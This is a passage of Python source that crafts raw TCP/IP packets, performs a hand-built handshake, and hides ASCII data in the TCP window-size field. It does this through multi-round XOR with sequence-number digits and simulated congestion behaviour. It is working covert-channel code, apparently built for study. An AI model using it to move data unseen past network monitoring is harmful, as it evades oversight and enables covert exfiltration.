            response_src_ip = socket.inet_ntoa(iph[8])
            if response_src_ip != dest_ip:
                continue
            
            # Parse TCP header
            tcp_header = response_packet[ihl:ihl+20]
            if len(tcp_header) < 20:
                continue
                
            tcph = struct.unpack('!HHLLBBHHH', tcp_header)
            response_src_port = tcph[0]
            response_dst_port = tcph[1]
            seq_num = tcph[2]
            ack_num = tcph[3]
            flags = tcph[5]
            
            # Debug: Show what we received
            print(f"[HANDSHAKE DEBUG] Received packet: src_port={response_src_port}, dst_port={response_dst_port}, flags=0x{flags:02x}, seq={seq_num}, ack={ack_num}")
            
            # Check if it's SYN-ACK from correct port
            if (response_src_port == DEST_PORT and response_dst_port == src_port and 
                (flags & 0x12) == 0x12 and  # SYN+ACK flags
                ack_num == initial_seq_num + 1):  # Correct ACK number
                
                server_seq_num = seq_num
                print(f"[HANDSHAKE] Step 2/3: Received SYN-ACK (server_seq={server_seq_num}, ack={ack_num})")
                break
            else:
                # Debug why it didn't match
                print(f"[HANDSHAKE DEBUG] SYN-ACK mismatch: expected src={DEST_PORT}/dst={src_port}/flags=0x12/ack={initial_seq_num + 1}")
                print(f"[HANDSHAKE DEBUG] Got src={response_src_port}/dst={response_dst_port}/flags=0x{flags:02x}/ack={ack_num}")
                
        except socket.timeout:
            continue
        except Exception:
            continue
    
    if server_seq_num is None:
        print(f"[HANDSHAKE] ❌ Timeout waiting for SYN-ACK")
        return None, None, None
    
    # Step 3: Send final ACK to complete handshake
    print(f"[HANDSHAKE] Step 3/3: Sending final ACK")
    
    ack_packet = create_tcp_packet(
        src_ip=src_ip,
        dest_ip=dest_ip,
        src_port=src_port,
        dest_port=DEST_PORT,
        seq_num=initial_seq_num + 1,
        ack_num=server_seq_num + 1,
        flags=0x10,  # ACK flag
        window_size=65535,
        payload=b""
    )
    
    # Send final ACK
    send_sock.sendto(ack_packet, (dest_ip, 0))
    
    print(f"[HANDSHAKE] ✅ TCP handshake completed successfully!")
    print(f"[HANDSHAKE] Client ISN: {initial_seq_num}, Server ISN: {server_seq_num}")
    print(f"[HANDSHAKE] XOR Key will be derived from initial seq: {initial_seq_num}")
    
    # Return the next sequence numbers for data transmission AND initial seq for XOR
    client_next_seq = initial_seq_num + 1
    server_next_seq = server_seq_num + 1
    
    return client_next_seq, server_next_seq, initial_seq_num

def create_tcp_packet(src_ip, dest_ip, src_port, dest_port, seq_num, ack_num, flags, window_size, payload):
    """
    Create a complete TCP packet with IP header
    
    Args:
        src_ip: Source IP address
        dest_ip: Destination IP address
        src_port: Source port
        dest_port: Destination port
        seq_num: Sequence number
        ack_num: Acknowledgment number
        flags: TCP flags
        window_size: Window size
        payload: TCP payload data
        
    Returns:
        Complete packet (IP header + TCP header + payload)
    """
    # Create IP header
    payload_len = len(payload)
    total_tcp_len = 20 + payload_len  # TCP header + payload
    
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 20 + total_tcp_len  # IP header + TCP header + payload
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 64
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0  # Will be calculated below
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dest_ip)
    
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    
    # Pack IP header with checksum = 0 first
    ip_header = struct.pack('!BBHHHBBH4s4s',
        ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, 
        ip_proto, ip_check, ip_saddr, ip_daddr)
    
    # Calculate IP header checksum
    ip_check = checksum(ip_header)
    
    # Reconstruct IP header with correct checksum
    ip_header = struct.pack('!BBHHHBBH4s4s',
        ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, 
        ip_proto, ip_check, ip_saddr, ip_daddr)
    
    # Debug: Print checksum info for first few packets (only if payload < 10 to identify initial packets)
    if len(payload) < 10:
        print(f"[CHECKSUM] IP checksum: 0x{ip_check:04x}, total_len: {ip_tot_len}")
    
    # Create TCP header
    tcp_doff = 5  # Header length in 32-bit words
    tcp_check = 0
    tcp_urg_ptr = 0
    
    tcp_offset_res = (tcp_doff << 4) + 0
    
    tcp_header = struct.pack('!HHLLBBHHH',
        src_port, dest_port, seq_num, ack_num, tcp_offset_res,
        flags, window_size, tcp_check, tcp_urg_ptr)
    
    # Calculate TCP checksum
    src_addr = socket.inet_aton(src_ip)
    dst_addr = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header) + len(payload)
    
    # Create pseudo packet for checksum calculation
    psh = struct.pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol, tcp_length)
    pseudo_packet = psh + tcp_header + payload
    
    # Calculate TCP checksum
    tcp_check = checksum(pseudo_packet)
    
    # Debug: Print TCP checksum info for first few packets
    if len(payload) < 10:
        print(f"[CHECKSUM] TCP checksum: 0x{tcp_check:04x}, tcp_len: {tcp_length}")
    
    # Reconstruct TCP header with correct checksum
    tcp_header = struct.pack('!HHLLBBHHH',
        src_port, dest_port, seq_num, ack_num, tcp_offset_res,
        flags, window_size, tcp_check, tcp_urg_ptr)
    
    # Return complete packet
    return ip_header + tcp_header + payload

def encode_xor_window_size(ascii_value, seq_number, packet_index=0, mode='xor', use_current_seq=False):
    """
    Encode ASCII value using multi-round XOR with sequence number digits
    and realistic congestion window behavior for leftmost digits
    
    Args:
        ascii_value: ASCII character value (0-255)
        seq_number: Sequence number (initial_seq for fixed modes, current_seq for random mode)
        packet_index: Current packet index for congestion window simulation
        mode: XOR mode ('xor'/'xor1', 'xor2', 'xor3', 'random', 'random3')
        use_current_seq: Whether to use the current packet's sequence number (for random mode)
        
    Returns:
        Encoded window size with XOR-encoded covert data and realistic congestion behavior
    """
    global cwnd_simulator
    
    # Convert sequence number to string and pad with zeros if needed
    seq_str = str(seq_number).zfill(9)  # Ensure at least 9 digits
    
    # Extract XOR keys (rightmost digits first)
    xor_key1 = int(seq_str[-3:]) % 1000    # Rightmost 3 digits (bits 0-2)
    xor_key2 = int(seq_str[-6:-3]) % 1000  # Next 3 digits (bits 3-5)
    xor_key3 = int(seq_str[-9:-6]) % 1000  # Next 3 digits (bits 6-8)
    
    # Start with original ASCII value
    encoded_value = ascii_value
    
    # Determine XOR operation based on mode
    if mode in ['xor', 'xor1']:
        # Single XOR round
        encoded_value = encoded_value ^ xor_key1
        seq_type = "current" if use_current_seq else "initial"
        print(f"[XOR DEBUG] Mode {mode} ({seq_type} seq): {ascii_value} XOR {xor_key1} = {encoded_value}")
    elif mode == 'xor2':
        # Two XOR rounds
        encoded_value = encoded_value ^ xor_key1
        encoded_value = encoded_value ^ xor_key2
        seq_type = "current" if use_current_seq else "initial"
        print(f"[XOR DEBUG] Mode {mode} ({seq_type} seq): {ascii_value} XOR {xor_key1} XOR {xor_key2} = {encoded_value}")
    elif mode == 'xor3':
        # Three XOR rounds
        encoded_value = encoded_value ^ xor_key1
        encoded_value = encoded_value ^ xor_key2
        encoded_value = encoded_value ^ xor_key3
        seq_type = "current" if use_current_seq else "initial"
        print(f"[XOR DEBUG] Mode {mode} ({seq_type} seq): {ascii_value} XOR {xor_key1} XOR {xor_key2} XOR {xor_key3} = {encoded_value}")
    elif mode == 'random':
        # Random mode: single XOR with current packet's sequence number
        encoded_value = encoded_value ^ xor_key1
        print(f"[XOR DEBUG] Mode {mode} (dynamic seq={seq_number}): {ascii_value} XOR {xor_key1} = {encoded_value}")
    elif mode == 'random3':
        # Enhanced random mode: triple XOR with different parts of current sequence number
        step1 = encoded_value ^ xor_key1
        step2 = step1 ^ xor_key2
        encoded_value = step2 ^ xor_key3
        print(f"[XOR DEBUG] Mode {mode} (enhanced dynamic seq={seq_number}):")
        print(f"[XOR DEBUG]   Step 1: {ascii_value} XOR {xor_key1} = {step1}")
        print(f"[XOR DEBUG]   Step 2: {step1} XOR {xor_key2} = {step2}")
        print(f"[XOR DEBUG]   Step 3: {step2} XOR {xor_key3} = {encoded_value}")
        print(f"[XOR DEBUG]   Keys from seq {seq_number}: {xor_key1}(0-2), {xor_key2}(3-5), {xor_key3}(6-8)")
    
    # Ensure the encoded value fits in 3 digits (0-999)
    encoded_value = encoded_value % 1000
    
    # Get realistic window base from congestion window simulator
    window_base_kb = cwnd_simulator.get_current_window_base()
    
    # Create window size: leftmost digits from congestion control + rightmost 3 digits from XOR-encoded covert data
    window_size = window_base_kb * 1000 + encoded_value
    
    # Ensure it doesn't exceed TCP window size limit (65535)
    if window_size > 65535:
        # If we exceed limit, use smaller base
        window_base_kb = min(window_base_kb, 65)
        window_size = window_base_kb * 1000 + encoded_value
        
        # Final safety check
        if window_size > 65535:
            window_size = 65000 + encoded_value
    
    if mode == 'random3':
        seq_info = f"(enhanced dynamic seq={seq_number})"
    elif mode == 'random':
        seq_info = f"(current seq={seq_number})"
    else:
        seq_info = f"(initial seq={seq_number})"
    print(f"[CWND] XOR Window: {window_base_kb}KB base + XOR covert {encoded_value:03d} = {window_size} {seq_info}")
    
    return window_size

def decode_xor_window_size(window_size, seq_number, packet_index=0, mode='xor', use_current_seq=False):
    """
    Decode multi-round XOR-encoded window size back to ASCII character
    
    Args:
        window_size: Received window size
        seq_number: Sequence number (initial_seq for fixed modes, current_seq for random mode)
        packet_index: Current packet index (unused, kept for compatibility)
        mode: XOR mode ('xor'/'xor1', 'xor2', 'xor3', 'random', 'random3')
        use_current_seq: Whether to use the current packet's sequence number (for random mode)
        
    Returns:
        Decoded ASCII character value
    """
    # Extract the encoded 3-digit value from window size
    encoded_value = window_size % 1000
    
    # Convert sequence number to string and pad with zeros if needed
    seq_str = str(seq_number).zfill(9)  # Ensure at least 9 digits
    
    # Extract XOR keys (same as encoding)
    xor_key1 = int(seq_str[-3:]) % 1000    # Rightmost 3 digits (bits 0-2)
    xor_key2 = int(seq_str[-6:-3]) % 1000  # Next 3 digits (bits 3-5)
    xor_key3 = int(seq_str[-9:-6]) % 1000  # Next 3 digits (bits 6-8)
    
    # Decode by reversing XOR operations (XOR is self-inverse)
    ascii_value = encoded_value
    
    if mode in ['xor', 'xor1']:
        # Single XOR decode
        ascii_value = ascii_value ^ xor_key1
    elif mode == 'xor2':
        # Two XOR decode (reverse order)
        ascii_value = ascii_value ^ xor_key2
        ascii_value = ascii_value ^ xor_key1
    elif mode == 'xor3':
        # Three XOR decode (reverse order)
        ascii_value = ascii_value ^ xor_key3
        ascii_value = ascii_value ^ xor_key2
        ascii_value = ascii_value ^ xor_key1
    elif mode == 'random':
        # Random mode: single XOR with current packet's sequence number
        ascii_value = ascii_value ^ xor_key1
    elif mode == 'random3':
        # Enhanced random mode: reverse triple XOR (reverse order)
        ascii_value = ascii_value ^ xor_key3
        ascii_value = ascii_value ^ xor_key2
        ascii_value = ascii_value ^ xor_key1
    
    # Ensure valid byte range (0-255)
    ascii_value = ascii_value % 256
    
    return ascii_value

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(0) 